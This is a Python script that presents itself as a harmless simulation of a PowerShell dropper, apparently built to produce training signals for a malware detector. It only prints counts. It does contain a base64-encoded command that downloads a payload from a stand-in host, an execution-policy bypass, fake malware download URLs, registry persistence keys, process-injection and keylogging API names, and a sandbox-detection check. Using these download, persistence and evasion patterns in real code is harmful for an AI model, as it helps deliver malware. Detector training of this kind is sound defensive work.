#!/usr/bin/env python3
"""
SAFE SIMULATION — Simulates a PowerShell dropper's behavior patterns.
This script exercises the same feature-vector signals as a real
dropper but performs NO harmful operations.
"""
import base64
import hashlib
import os
import sys
import json

# ---- Dropper pattern: encoded command execution ----
ENCODED_COMMANDS = [
    base64.b64encode(b"powershell -ep bypass -nop -c 'Write-Host Test'").decode(),
    base64.b64encode(b"cmd.exe /c echo Odysseus-AI safe demo").decode(),
    base64.b64encode(b"Invoke-WebRequest -Uri http://10.0.0.1/payload -OutFile C:\\temp\\p.exe").decode(),
]

# ---- Dropper pattern: download URLs ----
DOWNLOAD_URLS = [
    "http://evil-cdn.example.com/update.exe",
    "http://192.168.1.100:8080/stage2.dll",
    "https://malware-delivery.example.net/dropper.ps1",
    "http://10.0.0.50/payload.bin",
]

# ---- Dropper pattern: registry persistence ----
REG_KEYS = [
    r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    r"HKLM\SYSTEM\CurrentControlSet\Services\MalwareService",
]

# ---- Dropper pattern: process injection API references ----
WIN_APIS = [
    "VirtualAlloc", "VirtualAllocEx", "VirtualProtect",
    "WriteProcessMemory", "CreateRemoteThread", "OpenProcess",
    "NtUnmapViewOfSection", "LoadLibraryA", "GetProcAddress",
    "WinExec", "ShellExecuteA", "CreateProcessA",
    "AdjustTokenPrivileges", "LookupPrivilegeValue",
    "SetWindowsHookEx", "GetAsyncKeyState", "keybd_event",
    "CryptEncrypt", "CryptDecrypt", "CryptAcquireContext",
    "InternetOpenA", "HttpSendRequestA", "URLDownloadToFile",
]

# ---- Dropper pattern: hash-based sandbox detection ----
def simulate_sandbox_check():
    hostname = os.environ.get("COMPUTERNAME", os.environ.get("HOSTNAME", "unknown"))
    username = os.environ.get("USERNAME", os.environ.get("USER", "unknown"))
    h = hashlib.md5(f"{hostname}:{username}".encode()).hexdigest()
    KNOWN_SANDBOX_HASHES = [
        "d41d8cd98f00b204e9800998ecf8427e",
        "098f6bcd4621d373cade4e832627b4f6",
    ]
    return h in KNOWN_SANDBOX_HASHES

# ---- SAFE: Just print, don't execute ----
print("[SAFE] Simulated dropper patterns for Odysseus-AI training")
print(f"[DEMO] {len(ENCODED_COMMANDS)} encoded command blocks")
print(f"[DEMO] {len(DOWNLOAD_URLS)} download URL references")
print(f"[DEMO] {len(REG_KEYS)} registry persistence targets")
print(f"[DEMO] {len(WIN_APIS)} suspicious API references")
print(f"[DEMO] Sandbox check result: {simulate_sandbox_check()}")
print("[SAFE] No harmful operations performed.")
